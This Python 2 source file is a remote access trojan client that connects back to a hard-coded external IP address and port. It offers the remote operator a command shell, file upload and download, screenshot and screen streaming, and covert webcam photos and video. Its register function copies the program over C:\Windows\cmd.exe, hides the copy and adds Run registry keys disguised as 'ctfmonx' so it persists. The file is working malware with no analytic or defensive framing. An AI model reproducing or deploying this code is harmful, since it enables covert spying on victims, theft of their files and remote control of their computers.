#-*- coding: utf-8 -*
import socket
import sys
import os
import time
import cv2
import pickle
import shutil
from PIL import ImageGrab
from PIL import Image
os.chdir(os.path.split(os.path.realpath( sys.argv[0] ) )[0])

class Client:
    def __init__(self,ip,port):
        self.addr = ip,port
        self.wide = 1024 * 512
        print "[+]Init Successfully..."


    #connect func
    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect(self.addr)
                print "[+]Connect Successfully..."
                break
            except Exception as e:
                self.sock.close()
                print "[-]Waiting:"+str(e)
                time.sleep(5)


    #sendmsg base
    def sendobj(self,data):
        data = pickle.dumps(data)
        length = len(data)
        self.sock.sendall(str(length))
        while not self.sock.recv(1024) == "recv_length":
            continue
        self.sock.sendall(data)
        while not self.sock.recv(1024) == "recv_data":
            print 'wait'


    #recevie base
    def recvobj(self):
        length = int(self.sock.recv(1024))
        self.sock.sendall("recv_length")
        data = ""
        while not length == len(data):
            data += self.sock.recv(length * 2)
        self.sock.sendall("recv_data")
        data = pickle.loads(data)
        return data


    #main func
    def check(self):
        while True:
            try:
                getcmd = self.recvobj()
                if getcmd == "shell":
                    self.shell()
                elif getcmd == "state":
                    print ".",
                elif getcmd == "download":
                    self.filesend()
                elif getcmd == "upload":
                    self.filerecv()
                elif getcmd == "screenshot":
                    self.screenshot()
                elif getcmd == "screen_stream":
                    self.screen_stream()
                elif getcmd == "webcam_snap":
                    self.webcam_snap()
                elif getcmd == "webcam_stream":
                    self.webcam_stream()
                elif getcmd == "close":
                    self.close()
                    return 0
                elif getcmd == "end":
                    self.close()
                    self.end()
                    return 1
                elif getcmd == "space":
                    self.recvobj()
                else:
                    pass
            except Exception as e:
                print "[-]Failed:"+str(e)
                break


    def shell(self):
        self.sendobj("shell")
        print "[+]Shell:Start"
        while True:
            cmd = self.recvobj()
            if cmd == "space":
                continue
            if not cmd == "exit":
                cmd = cmd.decode('utf-8').encode('gbk')
                proc = os.popen(cmd)
                output = proc.read() + "\n -- end --"
                output = output.decode('gbk').encode('utf-8')
                self.sendobj(output)
            else:
                print "[+]Shell:Exit"
                break


    def filesend(self):
        print "[+]FileSend:Start"
        filepath = self.recvobj()
        if not os.path.exists(filepath):
            data = "File Not Exist"
        else:
            f = open(filepath,"rb")
            data = f.read()
            f.close()
        self.sendobj(data)
        print "[+]FileSend:Exit"


    def filerecv(self):
        print "[+]FileRecv:Start"
        filepath = self.recvobj()
        s = self.recvobj()
        if s == "File Not Exist":
            print s
        else:
            f = open("D:\\"+filepath,"wb")
            f.write(s)
            f.close()
        print "[+]FileRecv:Exit"


    def screenshot(self):
        print "[+]Screenshot:Start"
        im = ImageGrab.grab()
        data = im.tobytes('jpeg', 'RGB')
        self.sendobj(data)
        print "[+]Screenshot:Exit"


    def screen_stream(self):
        print "[+]Screen Stream:Start"
        sec = int(self.recvobj())
        fps = int(self.recvobj())
        size = ImageGrab.grab().size
        self.sendobj(size)
        bef = int(time.time())
        while int(time.time()) - bef < sec:
            im = ImageGrab.grab()
            data = im.tobytes('jpeg', 'RGB')
            self.sendobj(data)
            print ".",
        self.sendobj("ScreenStream:END")
        print "[+]Screen Stream:Exit"


    def webcam_snap(self):
        print "[+]Taking Photo"
        cap = cv2.VideoCapture(0)
        time.sleep(2)
        ret, frame = cap.read()
        cap.release()
        data = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)).tobytes('jpeg', 'RGB')
        self.sendobj(data)
        print "[+]Photo:Exit"


    def webcam_stream(self):
        print "[+]Record Video:Start"
        cap = cv2.VideoCapture(0)
        sec = int(self.recvobj())
        fps = int(self.recvobj())
        ret, frame = cap.read()
        size = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)).size
        self.sendobj(size)
        bef = int(time.time())
        while int(time.time()) - bef < sec:
            ret,frame = cap.read()
            data = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)).tobytes('jpeg', 'RGB')
            self.sendobj(data)
            print ".",
        cap.release()
        self.sendobj("WebcamStream:END")
        print "[+]Record Video:Exit"


    def close(self):
        self.sock.close()


    def end(self):
        cmd = "taskkill /F /FI 'USERNAME eq administrator' /IM " + os.path.basename(sys.argv[0]).decode('utf-8').encode('gbk')
        os.popen(cmd)


    def register(self):
        try:
            if not os.path.basename(sys.argv[0]) == "cmd.exe":
                cmd = "msg * \"请使用管理员模式运行\"".decode('utf-8').encode('gbk')
                os.popen(cmd)
                cmd = "copy /y \"" + os.path.abspath(sys.argv[0]).decode('utf-8').encode('gbk') + "\" C:\Windows\cmd.exe"
                os.popen(cmd)
                cmd = "attrib +S +H C:\\Windows\\cmd.exe"
                os.popen(cmd)
                cmd = r"echo yes|reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ctfmonx /d C:\Windows\cmd.exe"
                os.popen(cmd)
                cmd = r"echo yes|reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ctfmonx /d C:\Windows\cmd.exe"
                os.popen(cmd)
                cmd = r"start C:\Windows\cmd.exe"
                os.popen(cmd)
        except Exception as e:
            print str(e)




def main():
    cc = Client('120.78.136.136',12316)
    cc.register()

    while True:
        cc.connect()
        if cc.check() == 1:
            return


if __name__ == '__main__':
    main()



